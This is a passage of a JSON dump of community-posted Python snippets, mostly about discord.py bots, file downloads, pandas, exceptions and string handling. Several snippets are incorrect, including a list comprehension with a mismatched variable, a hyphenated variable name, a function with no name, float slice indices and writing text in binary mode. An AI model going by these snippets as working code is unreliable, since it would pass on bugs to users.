    "description": "@commands.guild_only() # Command cannot be used in private messages.  @commands.is_owner() # Command can only be used by the bot owner.  @commands.is_nsfw() # Command can only be used in NSFW channels  @commands.has_role(\"name\")  # Check if member has a role with the name \"name\"  @commands.bot_has_role(11132312313213)  # As above, but for the bot itself. (name can be replaced with id)  @commands.has_any_role([\"role1\",\"foo\",11132312313213])  # Check if user has any of the roles with the names \"role1\", \"foo\", or the role with id 11132312313213  @commands.bot_has_any_role(*roles)  # As above, but for the bot itself  @commands.has_permissions([ban_members=True, kick_members=True])  # Check if user has all of the passed permissions  #  e.g. this command will require both kick and ban permissions  @commands.bot_has_permissions(**perms) # As above, but for the bot itself.  @commands.has_guild_permissions(**perms) @commands.bot_has_guild_permissions(**perms) # As for the two above, but for guild permissions rather than channel permissions.  @commands.check(myfunction) # Check against your own function that returns those able to use your command  @commands.check_any(*myfunctions) # Command will be ran if the conditions of any of your own check functions are met  from discord.ext.commands.cooldowns import BucketType # BucketType can be BucketType.default, member, user, guild, role, or channel @commands.cooldown(rate,per,BucketType)  # Limit how often a command can be used, (num per, seconds, BucketType)  @commands.max_concurrency(number, per=BucketType.default, *, wait=False) # Limit how many instances of the command can be running at the same time. # Setting wait=True will queue up additional commands. False will raise MaxConcurrencyReached  # Checks can be stacked, and will Raise a CheckFailure if any check fails.\n",
    "reg_date": "2021-10-12T11:33:07.000Z"
  },
  {
    "id": 3250,
    "keyword": null,
    "link": null,
    "title": " python discord bot join voice channel",
    "description": "@bot.command() async def join(ctx):     channel = ctx.author.voice.channel     await channel.connect() @bot.command() async def leave(ctx):     await ctx.voice_client.disconnect()\n@client.command() async def join(ctx):     channel = ctx.author.voice.channel     await channel.connect()      @client.command() async def leave(ctx):     await ctx.voice_client.disconnect()\n",
    "reg_date": "2021-10-12T11:33:08.000Z"
  },
  {
    "id": 3251,
    "keyword": null,
    "link": null,
    "title": " python discord music bot",
    "description": "There were some changes to youtube_dl and FFmpeg, so this should work.  import discord  import youtube_dl  from discord.ext import commands  ydl_opts = {     'format': 'bestaudio/best',     'postprocessors': [{         'key': 'FFmpegExtractAudio',         'preferredcodec': 'mp3',         'preferredquality': '192',     }], }     def endSong(guild, path):     os.remove(path)                                     @cat.command(pass_context=True) async def play(ctx, url):     if not ctx.message.author.voice:         await ctx.send('you are not connected to a voice channel')         return      else:         channel = ctx.message.author.voice.channel      voice_client = await channel.connect()      guild = ctx.message.guild      with youtube_dl.YoutubeDL(ydl_opts) as ydl:         file = ydl.extract_info(url, download=True)         path = str(file['title']) + \"-\" + str(file['id'] + \".mp3\")      voice_client.play(discord.FFmpegPCMAudio(path), after=lambda x: endSong(guild, path))     voice_client.source = discord.PCMVolumeTransformer(voice_client.source, 1)      await ctx.send(f'**Music: **{url}') Optional, useful function If you want you can make your bot leave the voice channel after the song/music stop playing. Add this at the end of your code.  while voice_client.is_playing():         await asyncio.sleep(1)     else:         await voice_client.disconnect()         print(\"Disconnected\") If something wouldn't work If you had any problem with understanding the code or something wouldn't work, comment under my answer and I'll try my best to help you. Btw if you are thinking about hosting your bot on Heroku I can help you with that, because there are some things you need to do to make your music bot run there.\n",
    "reg_date": "2021-10-12T11:33:08.000Z"
  },
  {
    "id": 3252,
    "keyword": null,
    "link": null,
    "title": " python discord py make embed",
    "description": "def server(self, ctx):         \"\"\"Shows server info\"\"\"          server = ctx.message.server          roles = str(len(server.roles))         emojis = str(len(server.emojis))         channels = str(len(server.channels))          embeded = discord.Embed(title=server.name, description='Server Info', color=0xEE8700)         embeded.set_thumbnail(url=server.icon_url)         embeded.add_field(name=\"Created on:\", value=server.created_at.strftime('%d %B %Y at %H:%M UTC+3'), inline=False)         embeded.add_field(name=\"Server ID:\", value=server.id, inline=False)         embeded.add_field(name=\"Users on server:\", value=server.member_count, inline=True)         embeded.add_field(name=\"Server owner:\", value=server.owner, inline=True)          embeded.add_field(name=\"Default Channel:\", value=server.default_channel, inline=True)         embeded.add_field(name=\"Server Region:\", value=server.region, inline=True)         embeded.add_field(name=\"Verification Level:\", value=server.verification_level, inline=True)          embeded.add_field(name=\"Role Count:\", value=roles, inline=True)         embeded.add_field(name=\"Emoji Count:\", value=emojis, inline=True)         embeded.add_field(name=\"Channel Count:\", value=channels, inline=True)          await self.bot.say(embed=embeded) \ndef userinfo(self, ctx, *, user: discord.Member = None):         \"\"\"         Get information about you, or a specified user.          `user`: The user who you want information about. Can be an ID, mention or name.         \"\"\"          if user is None:             user = ctx.author          embed = discord.Embed(             colour=utils.user_colour(user),             title=f\"{user.name}'s Stats and Information.\"         )         embed.set_footer(text=f\"ID: {user.id}\")         embed.set_thumbnail(url=user.avatar_url_as(format=\"png\"))         embed.add_field(name=\"__**General information:**__\", value=f\"**Discord Name:** {user}\\n\"                                                                    f\"**Account created:** {user.created_at.__format__('%A %d %B %Y at %H:%M')}\\n\"                                                                    f\"**Status:** {utils.user_status(user)}\\n\"                                                                    f\"**Activity:** {utils.user_activity(user)}\", inline=False)         embed.add_field(name=\"__**Server-related information:**__\", value=f\"**Nickname:** {user.nick}\\n\"                                                                           f\"**Joined server:** {user.joined_at.__format__('%A %d %B %Y at %H:%M')}\\n\"                                                                           f\"**Roles:** {' '.join([r.mention for r in user.roles[1:]])}\")         return await ctx.send(embed=embed) \n@client.event async def on_message(message):     if message.content.startswith('!hello'):         embedVar = discord.Embed(title=\"Title\", description=\"Desc\", color=0x00ff00)         embedVar.add_field(name=\"Field1\", value=\"hi\", inline=False)         embedVar.add_field(name=\"Field2\", value=\"hi2\", inline=False)         await message.channel.send(embed=embedVar) \nembed.set_thumbnail(url=\"https://i.imgur.com/axLm3p6.jpeg\")\n",
    "reg_date": "2021-10-12T11:33:08.000Z"
  },
  {
    "id": 3253,
    "keyword": null,
    "link": null,
    "title": " python display object attributes",
    "description": "object_name.__dict__\n",
    "reg_date": "2021-10-12T11:33:08.000Z"
  },
  {
    "id": 3254,
    "keyword": null,
    "link": null,
    "title": " python displaying the time",
    "description": "import datetime now = datetime.datetime.now() print (\"Current date and time : \") print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))  \n",
    "reg_date": "2021-10-12T11:33:08.000Z"
  },
  {
    "id": 3255,
    "keyword": null,
    "link": null,
    "title": " python distance between coordinates",
    "description": "dist = math.sqrt((x2 - x1)**2 + (y2 - y1)**2)\nimport geopy.distance  coords_1 = (52.2296756, 21.0122287) coords_2 = (52.406374, 16.9251681)  print(geopy.distance.distance(coords_1, coords_2).km) \n",
    "reg_date": "2021-10-12T11:33:08.000Z"
  },
  {
    "id": 3256,
    "keyword": null,
    "link": null,
    "title": " python distance of coordinates",
    "description": "dist = math.sqrt((x2 - x1)**2 + (y2 - y1)**2)\n",
    "reg_date": "2021-10-12T11:33:08.000Z"
  },
  {
    "id": 3257,
    "keyword": null,
    "link": null,
    "title": " python divide every element in a list by a number",
    "description": "# Example usage using list comprehension: # Say you want to divide every number in your_list by some number your_list = [10,20,30,40,50,60,70,80,90] new_list = [x / 10 for item in your_list]  print(new_list) --> [1,2,3,4,5,6,7,8,9] # Each number divided by 10\n",
    "reg_date": "2021-10-12T11:33:08.000Z"
  },
  {
    "id": 3258,
    "keyword": null,
    "link": null,
    "title": " python divide one column by another",
    "description": "df['Result'] = df['Column A']/df['Column B']\n",
    "reg_date": "2021-10-12T11:33:08.000Z"
  },
  {
    "id": 3259,
    "keyword": null,
    "link": null,
    "title": " python divide string in half",
    "description": "firstpart, secondpart = string[:len(string)/2], string[len(string)/2:] \n",
    "reg_date": "2021-10-12T11:33:09.000Z"
  },
  {
    "id": 3260,
    "keyword": null,
    "link": null,
    "title": " python dividing strings by amount of letters",
    "description": ">>> line = '1234567890' >>> n = 2 >>> [line[i:i+n] for i in range(0, len(line), n)] ['12', '34', '56', '78', '90'] \n",
    "reg_date": "2021-10-12T11:33:09.000Z"
  },
  {
    "id": 3261,
    "keyword": null,
    "link": null,
    "title": " python division by zero",
    "description": "def division(n, d):     return n / d if d else 0\n",
    "reg_date": "2021-10-12T11:33:09.000Z"
  },
  {
    "id": 3262,
    "keyword": null,
    "link": null,
    "title": " python dlete folder",
    "description": "import shutil  shutil.rmtree('/folder_name')\n",
    "reg_date": "2021-10-12T11:33:09.000Z"
  },
  {
    "id": 3263,
    "keyword": null,
    "link": null,
    "title": " python double asterisk math",
    "description": "# double asterik (**) is the power operator.  # The number to the left is raised to the power of the number on the right # Example. two_to_the_power_five = 2**5 # 2 is raised to the fifth power \n",
    "reg_date": "2021-10-12T11:33:09.000Z"
  },
  {
    "id": 3264,
    "keyword": null,
    "link": null,
    "title": " python download and read csv from url",
    "description": "import csv import requests  CSV_URL = 'http://samplecsvs.s3.amazonaws.com/Sacramentorealestatetransactions.csv'  with requests.Session() as s:     download = s.get(CSV_URL)      decoded_content = download.content.decode('utf-8')      cr = csv.reader(decoded_content.splitlines(), delimiter=',')     my_list = list(cr)     for row in my_list:         print(row)\n",
    "reg_date": "2021-10-12T11:33:09.000Z"
  },
  {
    "id": 3265,
    "keyword": null,
    "link": null,
    "title": " python download file from url",
    "description": "import requests   url = 'https://www.facebook.com/favicon.ico' r = requests.get(url, allow_redirects=True)  open('facebook.ico', 'wb').write(r.content)\nimport urllib.request imgURL = \"http://site.meishij.net/r/58/25/3568808/a3568808_142682562777944.jpg\"  urllib.request.urlretrieve(imgURL, \"D:/abc/image/local-filename.jpg\") \nimport urllib.request pdf_path = \"\" def download_file(download_url, filename):     response = urllib.request.urlopen(download_url)         file = open(filename + \".pdf\", 'wb')     file.write(response.read())     file.close()   download_file(pdf_path, \"Test\")\nimport wget  url = \"https://www.python.org/static/img/python-logo@2x.png\"  wget.download(url, 'c:/users/LikeGeeks/downloads/pythonLogo.png')\nimport urllib2response = urllib2.urlopen('https://wordpress.org/plugins/about/readme.txt')data = response.read()print(data)\nimport urllib2  # the lib that handles the url stuff  data = urllib2.urlopen(target_url) # it's a file like object and works just like a file for line in data: # files are iterable     print line\n",
    "reg_date": "2021-10-12T11:33:09.000Z"
  },
  {
    "id": 3266,
    "keyword": null,
    "link": null,
    "title": " python download form web",
    "description": "import requests   url = 'https://www.facebook.com/favicon.ico' r = requests.get(url, allow_redirects=True)  open('facebook.ico', 'wb').write(r.content)\n",
    "reg_date": "2021-10-12T11:33:09.000Z"
  },
  {
    "id": 3267,
    "keyword": null,
    "link": null,
    "title": " python download image",
    "description": "import urllib.request  image_url = 'https://bit.ly/2XuVzB4' #the image on the web save_name = 'my_image.jpg' #local name to be saved urllib.request.urlretrieve(image_url, save_name)\nimport urllib.request imgURL = \"http://site.meishij.net/r/58/25/3568808/a3568808_142682562777944.jpg\"  urllib.request.urlretrieve(imgURL, \"D:/abc/image/local-filename.jpg\") \nimport requests with open('00000001.jpg','wb') as f: \tf.write(requests.get('http://www.gunnerkrigg.com//comics/00000001.jpg').content) \n",
    "reg_date": "2021-10-12T11:33:09.000Z"
  },
  {
    "id": 3268,
    "keyword": null,
    "link": null,
    "title": " python download image from url",
    "description": "import urllib.request  image_url = 'https://bit.ly/2XuVzB4' #the image on the web save_name = 'my_image.jpg' #local name to be saved urllib.request.urlretrieve(image_url, save_name)\nimport urllib.request imgURL = \"http://site.meishij.net/r/58/25/3568808/a3568808_142682562777944.jpg\"  urllib.request.urlretrieve(imgURL, \"D:/abc/image/local-filename.jpg\") \nimport urllib.request urllib.request.urlretrieve(url, filename)\nimport urllib.request  #python 3 urllib.request.urlretrieve(url, filename)\nresponse = requests.get(\"https://i.imgur.com/ExdKOOz.png\")\n",
    "reg_date": "2021-10-12T11:33:09.000Z"
  },
  {
    "id": 3269,
    "keyword": null,
    "link": null,
    "title": " python download s3 image",
    "description": "import boto3  s3 = boto3.client('s3', aws_access_key_id=... , aws_secret_access_key=...) s3.download_file('BUCKET_NAME', 'OBJECT_NAME', 'FILE_NAME')\n",
    "reg_date": "2021-10-12T11:33:09.000Z"
  },
  {
    "id": 3270,
    "keyword": null,
    "link": null,
    "title": " python drop axis",
    "description": "df = pd.DataFrame(np.arange(12).reshape(3, 4), ...                   columns=['A', 'B', 'C', 'D']) >>> df    A  B   C   D 0  0  1   2   3 1  4  5   6   7 2  8  9  10  11  Drop columns >>> df.drop(['B', 'C'], axis=1)    A   D 0  0   3 1  4   7 2  8  11 >>> df.drop(columns=['B', 'C'])    A   D 0  0   3 1  4   7 2  8  11\ndf.drop(['colonna da togliere'], axis=1)\n>>>df = pd.DataFrame(np.arange(12).reshape(3, 4),                       columns=['A', 'B', 'C', 'D']) >>>df    A  B   C   D 0  0  1   2   3 1  4  5   6   7 2  8  9  10  11  >>> df.drop(['B', 'C'], axis=1)    A   D 0  0   3 1  4   7 2  8  11  OR  >>> df.drop(columns=['B', 'C'])    A   D 0  0   3 1  4   7 2  8  11\n",
    "reg_date": "2021-10-12T11:33:10.000Z"
  },
  {
    "id": 3271,
    "keyword": null,
    "link": null,
    "title": " python dump object print",
    "description": "print(dir(your_variable))\ndef (myObject):   print(vars(myObject))\n",
    "reg_date": "2021-10-12T11:33:10.000Z"
  },
  {
    "id": 3272,
    "keyword": null,
    "link": null,
    "title": " python duplicate file",
    "description": ">>> import shutil >>> # Copy the file in same folder with different name >>> shutil.copy('original.txt', 'duplicate.txt') '/home/username/duplicate.txt' >>> shutil.copy('original.txt', 'my_folder/duplicate.txt') '/home/username/my_folder/duplicate.txt'\nimport shutil  original = r'original path where the file is currently stored\\file name.file extension' target = r'target path where the file will be copied\\file name.file extension'  shutil.copyfile(original, target) \n",
    "reg_date": "2021-10-12T11:33:10.000Z"
  },
  {
    "id": 3273,
    "keyword": null,
    "link": null,
    "title": " python easter egg",
    "description": "#This is a python easter egg #just do the following import this\n",
    "reg_date": "2021-10-12T11:33:10.000Z"
  },
  {
    "id": 3274,
    "keyword": null,
    "link": null,
    "title": " python edit text file",
    "description": " with open(\"foo.txt\", \"a\") as f:      f.write(\"new line\\n\")\n#write f = open('helloworld.txt','wb') f.write('hello world') f.close()  #read f = open('helloworld.txt','r') message = f.read() print(message) f.close()\n",
    "reg_date": "2021-10-12T11:33:10.000Z"
  },
  {
    "id": 3275,
    "keyword": null,
    "link": null,
    "title": " python elapsed time",
    "description": "import time  start = time.time() print(\"hello\") end = time.time() print(end - start)\nimport time  start = time.time() print(\"hello\") end = time.time() print(end - start) \nimport time t0= time.clock() print(\"Hello\") t1 = time.clock() - t0 print(\"Time elapsed: \", t1) # CPU seconds elapsed (floating point)\n",
    "reg_date": "2021-10-12T11:33:10.000Z"
  },
  {
    "id": 3276,
    "keyword": null,
    "link": null,
    "title": " python elementtree build xml",
    "description": "import xml.etree.cElementTree as ET  root = ET.Element(\"root\") doc = ET.SubElement(root, \"doc\")  ET.SubElement(doc, \"field1\", name=\"blah\").text = \"some value1\" ET.SubElement(doc, \"field2\", name=\"asdfasd\").text = \"some vlaue2\"  tree = ET.ElementTree(root) tree.write(\"filename.xml\") \n",
    "reg_date": "2021-10-12T11:33:10.000Z"
  },
  {
    "id": 3277,
    "keyword": null,
    "link": null,
    "title": " python empty variable",
    "description": "#use NoneType as a placeholder variable = None\nvar = None\nvariable = str() variable1 = int() variable2 = dict() variable3 = list() variable4 = bool() variable5 = bin() ...\nString [] names = new String[0];  // or   int [] ages = {} \n",
    "reg_date": "2021-10-12T11:33:10.000Z"
  },
  {
    "id": 3278,
    "keyword": null,
    "link": null,
    "title": " python end script",
    "description": "exit()\nimport sys  sys.exit()\n",
    "reg_date": "2021-10-12T11:33:10.000Z"
  },
  {
    "id": 3279,
    "keyword": null,
    "link": null,
    "title": " python enumerate list",
    "description": "languages = ['Python', 'C', 'C++', 'C#', 'Java']  #Bad way i = 0 #counter variable for language in languages:     print(i, language)     i+=1  #Good Way for i, language in enumerate(languages):     print(i, language) \n>>> for count, value in enumerate(values): ...     print(count, value) ... 0 a 1 b 2 c \n>>> values = [\"a\",\"b\",\"c\"] >>> for count, value in enumerate(values): ...     print(count, value) ... 0 a 1 b 2 c \nrhymes=['check','make','rake'] for rhyme in enumerate(rhymes):     print(rhyme) #prints out : (0, 'check') (1, 'make') (2, 'rake') #basically just prints out list elements with their index\ngrocery = ['bread', 'milk', 'butter']  for item in enumerate(grocery):   print(item)  print('\\n') for count, item in enumerate(grocery):   print(count, item)  print('\\n') # changing default start value for count, item in enumerate(grocery, 100):   print(count, item)    OUTPUT:  (0, 'bread') (1, 'milk') (2, 'butter')  0 bread 1 milk 2 butter  100 bread 101 milk 102 butter\t\nfor key, value in enumerate([\"p\", \"y\", \"t\", \"h\", \"o\", \"n\"]):     print key, value  \"\"\" 0 p 1 y 2 t 3 h 4 o 5 n \"\"\" \n",
    "reg_date": "2021-10-12T11:33:10.000Z"
  },
  {
    "id": 3280,
    "keyword": null,
    "link": null,
    "title": " python error: command 'x86 64-linux-gnu-gcc' failed with exit status 1",
    "description": "$ sudo apt-get install libxml2-dev libxslt1-dev \nsudo apt-get install gcc python3.x-dev # choose correct python version\n",
    "reg_date": "2021-10-12T11:33:10.000Z"
  },
  {
    "id": 3281,
    "keyword": null,
    "link": null,
    "title": " python everything after last slash",
    "description": "url.rsplit('/', 1)[-1]\n",
    "reg_date": "2021-10-12T11:33:11.000Z"
  },
  {
    "id": 3282,
    "keyword": null,
    "link": null,
    "title": " python exception element not found",
    "description": "from selenium.common.exceptions import NoSuchElementException  try:     if driver.find_element_by_class_name(test_element_class_name).is_displayed():         print('found') except NoSuchElementException:     pass\ntry:        elem = driver.find_element_by_xpath(\".//*[@id='SORM_TB_ACTION0']\")        elem.click() except nosuchelementexception:        pass\n",
    "reg_date": "2021-10-12T11:33:11.000Z"
  },
  {
    "id": 3283,
    "keyword": null,
    "link": null,
    "title": " python exception list",
    "description": "AssertionError\t\t\t#Raised when assert statement fails. AttributeError\t\t\t#Raised when attribute assignment or reference fails. EOFError\t\t\t\t#Raised when the input() functions hits end-of-file condition. FloatingPointError\t\t#Raised when a floating point operation fails. GeneratorExit\t\t\t#Raise when a generator's close() method is called. ImportError\t\t\t\t#Raised when the imported module is not found. IndexError\t\t\t\t#Raised when index of a sequence is out of range. KeyError\t\t\t\t#Raised when a key is not found in a dictionary. KeyboardInterrupt\t\t#Raised when the user hits interrupt key (Ctrl+c or delete). MemoryError\t\t\t\t#Raised when an operation runs out of memory. NameError\t\t\t\t#Raised when a variable is not found in local or global scope. NotImplementedError\t\t#Raised by abstract methods. OSError\t\t\t\t\t#Raised when system operation causes system related error. OverflowError\t\t\t#Raised when result of an arithmetic operation is too large to be represented. ReferenceError\t\t\t#Raised when a weak reference proxy is used to access a garbage collected referent. RuntimeError\t\t\t#Raised when an error does not fall under any other category. StopIteration\t\t\t#Raised by next() function to indicate that there is no further item to be returned by iterator. SyntaxError\t\t\t\t#Raised by parser when syntax error is encountered. IndentationError\t\t#Raised when there is incorrect indentation. TabError\t\t\t\t#Raised when indentation consists of inconsistent tabs and spaces. SystemError\t\t\t\t#Raised when interpreter detects internal error. SystemExit\t\t\t\t#Raised by sys.exit() function. TypeError\t\t\t\t#Raised when a function or operation is applied to an object of incorrect type. UnboundLocalError\t\t#Raised when a reference is made to a local variable in a function or method, but no value has been bound to that variable. UnicodeError\t\t\t#Raised when a Unicode-related encoding or decoding error occurs. UnicodeEncodeError\t\t#Raised when a Unicode-related error occurs during encoding. UnicodeDecodeError\t\t#Raised when a Unicode-related error occurs during decoding. UnicodeTranslateError\t#Raised when a Unicode-related error occurs during translating. ValueError\t\t\t\t#Raised when a function gets argument of correct type but improper value. ZeroDivisionError\t\t#Raised when second operand of division or modulo operation is zero.\nBaseException    ] SystemExit    ] KeyboardInterrupt    ] GeneratorExit    ] Exception         ] StopIteration         ] StopAsyncIteration         ] ArithmeticError         |    ] FloatingPointError         |    ] OverflowError         |    ] ZeroDivisionError         ] AssertionError         ] AttributeError         ] BufferError         ] EOFError         ] ImportError         |    ] ModuleNotFoundError         ] LookupError         |    ] IndexError         |    ] KeyError         ] MemoryError         ] NameError         |    ] UnboundLocalError         ] OSError         |    ] BlockingIOError         |    ] ChildProcessError         |    ] ConnectionError         |    |    ] BrokenPipeError         |    |    ] ConnectionAbortedError         |    |    ] ConnectionRefusedError         |    |    ] ConnectionResetError         |    ] FileExistsError         |    ] FileNotFoundError         |    ] InterruptedError         |    ] IsADirectoryError         |    ] NotADirectoryError         |    ] PermissionError         |    ] ProcessLookupError         |    ] TimeoutError         ] ReferenceError         ] RuntimeError         |    ] NotImplementedError         |    ] RecursionError         ] SyntaxError         |    ] IndentationError         |         ] TabError         ] SystemError         ] TypeError         ] ValueError         |    ] UnicodeError         |         ] UnicodeDecodeError         |         ] UnicodeEncodeError         |         ] UnicodeTranslateError         ] Warning              ] DeprecationWarning              ] PendingDeprecationWarning              ] RuntimeWarning              ] SyntaxWarning              ] UserWarning              ] FutureWarning              ] ImportWarning              ] UnicodeWarning              ] BytesWarning              ] ResourceWarning\ntry:    # Code to test / execute    print('Test') except (SyntaxError, IndexError) as E:  # specific exceptions    # Code in case of SyntaxError for example    print('Synthax or index error !') except :    # Code for any other exception    print('Other error !') else:    # Code if no exception caught    print('No error') finally:    # Code executed after try block (success) or any exception (ie everytime)    print('Done')  # This code is out of try / catch bloc print('Anything else')\ntry:   # code block except ValueError as ve:   print(ve)\n# main.py import datetime  from gw_utility.book import Book from gw_utility.logging import Logging   def main():     try:         # Create list and populate with Books.         books = list()         books.append(Book(\"Shadow of a Dark Queen\", \"Raymond E. Feist\", 497, datetime.date(1994, 1, 1)))         books.append(Book(\"Rise of a Merchant Prince\", \"Raymond E. Feist\", 479, datetime.date(1995, 5, 1)))         books.append(Book(\"Rage of a Demon King\", \"Raymond E. Feist\", 436, datetime.date(1997, 4, 1)))          # Output Books in list, with and without index.         Logging.line_separator('Books')         log_list(books)         Logging.line_separator('Books w/ index')         log_list(books, True)         # Output list element outside bounds.         Logging.line_separator('books[len(books)]')         Logging.log(f'books[{len(books)}]: {books[len(books)]}')     except IndexError as error:         # Output expected IndexErrors.         Logging.log_exception(error)     except Exception as exception:         # Output unexpected Exceptions.         Logging.log_exception(exception, False)   def log_list(collection, include_index=False):     \"\"\"Logs the each element in collection to the console.      :param collection: Collection to be iterated and output.     :param include_index: Determines if index is also output.     :return: None     \"\"\"     try:         # Iterate by converting to enumeration.         for index, item in enumerate(collection):             if include_index:                 Logging.log(f'collection[{index}]: {item}')             else:                 Logging.log(item)     except IndexError as error:         # Output expected IndexErrors.         Logging.log_exception(error)     except Exception as exception:         # Output unexpected Exceptions.         Logging.log_exception(exception, False)   if __name__ == \"__main__\":     main() \nclass MyError(TypeError):     pass  raise MyError('An error happened')\n",
    "reg_date": "2021-10-12T11:33:11.000Z"
  },
  {
    "id": 3284,
    "keyword": null,
    "link": null,
    "title": " python exception with line number",
    "description": "try:     raise NotImplementedError(\"Not implemented\") except Exception as e:     exception_type, exception_object, exception_traceback = sys.exc_info()     filename = exception_traceback.tb_frame.f_code.co_filename     line_number = exception_traceback.tb_lineno      print(\"Exception type: \", exception_type)     print(\"File name: \", filename)     print(\"Line number: \", line_number)\nimport traceback  try:     print(4/0) except ZeroDivisionError:     print(traceback.format_exc()) \n",
    "reg_date": "2021-10-12T11:33:11.000Z"
  },
  {
    "id": 3285,
    "keyword": null,
    "link": null,
    "title": " python execute bat file",
    "description": "import subprocess subprocess.call([r'C:\\Example\\For\\A\\Location\\Script.bat']) \nimport subprocess subprocess.call([r'path where the batch file is stored\\name of the batch file.bat'])\n",
    "reg_date": "2021-10-12T11:33:11.000Z"
  },
  {
    "id": 3286,
    "keyword": null,
    "link": null,
    "title": " python execute string",
    "description": "a = \"\"\" A = 5 if A > 0 : \tprint(\"A Is Positive\") elif A == 0 :  \tprint(\"A Is Equal To 0\") else :  \tprint(\"A Is Negative\") \"\"\" exec(a) >>> A Is Positive #you can also use eval(string) for asyncio\nimport foo method_to_call = getattr(foo, 'bar') result = method_to_call()\n",
    "reg_date": "2021-10-12T11:33:11.000Z"
  },
  {
    "id": 3287,
    "keyword": null,
    "link": null,
    "title": " python exit program",
    "description": "import sys sys.exit()\nimport sys  sys.exit()\n#Exit everywhere with error message import sys sys.exit(\"Code not Pythonical\")  #Exit with a specific status import os os._exit()  #Exit in interpreter quit()  #Exit in Interpreter but more user friendly exit()\n#to stop all execution of code exit()\nimport sys msg = \"bye bye\" sys.exit(msg) # you can use it with out a msg\nimport sys sys.exit()\t//This will exit the python program\n",
    "reg_date": "2021-10-12T11:33:11.000Z"
  },
  {
    "id": 3288,
    "keyword": null,
    "link": null,
    "title": " python export console output to file",
    "description": "sys.stdout = open(\"test.txt\", \"w\")  print(\"Hello World\")  sys.stdout.close() # TEST.TXT: # Hello World\n",
    "reg_date": "2021-10-12T11:33:11.000Z"
  },
  {
    "id": 3289,
    "keyword": null,
    "link": null,
    "title": " python export multiple dataframes to excel",
    "description": "#1. Create a pandas excel writer instance and name the excel file xlwriter = pd.ExcelWriter('Customer_Details.xlsx') #NB: If you don't include a file path like 'C:\\Users\\Ron\\Desktop\\File_Name.xlsx' # It will save to your default folder, that is, #where the file you're reading from is located.  #2. Write each dataframe to a worksheet with a name dfName.to_excel(xlwriter, sheet_name = 'Name', index = False) dfAddress.to_excel(xlwriter, sheet_name = 'Address', index = False) dfContact.to_excel(xlwriter, sheet_name = 'Contact', index = False)  #3. Close the instance xlwriter.close()\n# Create a Pandas Excel writer using XlsxWriter as the engine. with pd.ExcelWriter('pandas_multiple.xlsx', engine='xlsxwriter') as writer:         # Write each dataframe to a different worksheet.     final_df.to_excel(writer, sheet_name='Sheet1')     df_unigrams.to_excel(writer, sheet_name='Sheet2')     df_bigrams.to_excel(writer, sheet_name='Sheet3') \nwith pd.ExcelWriter(\"Data 2016.xlsx\") as writer:     data.to_excel(writer, \"Stock Prices\")     correlations.to_excel(writer, \"Correlations\")     data.pct_change().mul(100).to_excel(writer, \"Daily Changes\")\n",
    "reg_date": "2021-10-12T11:33:11.000Z"
  },
  {
    "id": 3290,
    "keyword": null,
    "link": null,
    "title": " python extract all numbers from string re",
    "description": ">>> str = \"h3110 23 cat 444.4 rabbit 11 2 dog\" >>> [int(s) for s in str.split() if s.isdigit()] [23, 11, 2] \n",
    "reg_date": "2021-10-12T11:33:11.000Z"
  },
  {
    "id": 3291,
    "keyword": null,
    "link": null,
    "title": " python extract every nth value from list",
    "description": "# Basic syntax: new_list = your_list[start_index::spacing]  # Example usage using list slicing: # Say you have the following list and want every third item your_list = [0,1,2,3,4,5,6,7,8,9] new_list = your_list[0::3]  print(new_list) --> [0, 3, 6, 9]\nstart_from = 0 every_nth = 2 a_list[start_from::every_nth]\nimport numpy as np values=np.arange(0,10) print(values[::2])\n",
    "reg_date": "2021-10-12T11:33:12.000Z"
  },
  {
    "id": 3292,
    "keyword": null,
    "link": null,
    "title": " python extract specific columns from pandas dataframe",
    "description": "# Basic syntax: new_dataframe = dataframe.filter(['col_name_1', 'col_name_2']) # Where the new_dataframe will only have the column names specified  # Note, use df.filter(['names', ... ], axis=0] to select rows \nimport pandas as pd  input_file = \"C:\\\\....\\\\consumer_complaints.csv\" dataset = pd.read_csv(input_file) df = pd.DataFrame(dataset) cols = [1,2,3,4] df = df[df.columns[cols]] \n",
    "reg_date": "2021-10-12T11:33:12.000Z"
  },
  {
    "id": 3293,
    "keyword": null,
    "link": null,
    "title": " python extraer primer elemento lista",
    "description": "lista = [1, 2, 3] elemento = lista.pop(0) print(elemento) # 1 print(lista) # [2, 3]\n",
    "reg_date": "2021-10-12T11:33:12.000Z"
  },
  {
    "id": 3294,
    "keyword": null,
    "link": null,
    "title": " python f string round",
    "description": "x = 3.14159265 print(f'pi = {x:.2f}') # 3.14\n",
    "reg_date": "2021-10-12T11:33:12.000Z"
  },
  {
    "id": 3295,
    "keyword": null,
    "link": null,
    "title": " python fdr correction",
    "description": "from statsmodels.stats.multitest import fdrcorrection  rejected, q-value = fdrcorrection(my_list_of_p_values)\n",
    "reg_date": "2021-10-12T11:33:12.000Z"
  },
  {
    "id": 3296,
    "keyword": null,
    "link": null,
    "title": " python ffmpeg",
    "description": "# to install ffmpeg pip install ffmpeg-python\nvoice.play(discord.FFmpegPCMAudio(executable=\"C:/path/ffmpeg.exe\", source=\"C:/songpath\"))  \n",
    "reg_date": "2021-10-12T11:33:12.000Z"
  },
  {
    "id": 3297,
    "keyword": null,
    "link": null,
    "title": " python fibonacci generator",
    "description": "def fib(num):     a = 0     b = 1     for i in range(num):         yield a         temp = a         a = b         b = temp + b   for x in fib(100):     print(x)   def fib2(num): # Creates fib numbers in a list     a = 0     b = 1     result = []     for i in range(num):         result.append(a)         temp = a         a = b         b = temp + b     return result   print(fib2(100)) \ndef fib(num):     a = 0     b = 1     for i in range(num):         yield a         a, b = b, a + b # Adds values together then swaps them  for x in fib(100):     print(x)\nnumber1 = 0 print('1:', number1) number2 = 1 for count in range(2, 101):   print(count, ':', number1 + number2)   number1 += number2   number2 = number1 - number2\n",
    "reg_date": "2021-10-12T11:33:12.000Z"
  },
  {
    "id": 3298,
    "keyword": null,
    "link": null,
    "title": " python file.write is not writing whole line",
    "description": "# When you see ellipses \"...\" at the end of an output  # it is likely because the output is too long  # for example use for i in range(len(df)):   var = df.loc[i, \"ex\"] # rather than for row in df.iterrows():   var = df.ex\n",
    "reg_date": "2021-10-12T11:33:12.000Z"
  },
  {
    "id": 3299,
    "keyword": null,
    "link": null,
    "title": " python file open modes",
